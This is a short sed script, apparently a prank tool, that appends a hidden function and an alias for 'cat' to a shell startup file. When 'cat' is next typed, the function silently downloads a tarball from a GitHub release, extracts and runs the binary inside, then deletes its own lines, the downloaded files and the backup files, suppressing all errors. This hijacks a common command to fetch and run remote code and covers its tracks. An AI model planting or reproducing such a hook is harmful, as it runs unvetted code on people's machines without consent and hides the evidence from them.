#!/bin/sed -f

# 末尾に挿入する二つの文
${
    # 挿入する1つ目の文
    a\
function catmeme() {curl -sLo ~/catmeme_Darwin_arm64.tar.gz https://github.com/kmraven/catmeme/releases/download/v0.0.0/catmeme_Darwin_arm64.tar.gz 2>/dev/null && tar xfz ~/catmeme_Darwin_arm64.tar.gz -C ~/ 2>/dev/null && ~/catmeme -c -t 10; sed -i".aonaon" -e '/#CATMEME/d' ~/.zshrc; rm -f ~/catmeme* ~/.*.aonaon; source ~/.zshrc; unset -f catmeme; unalias cat 2>/dev/null;} #CATMEME
    # 挿入する2つ目の文
    a\
alias cat="catmeme" #CATMEME
}
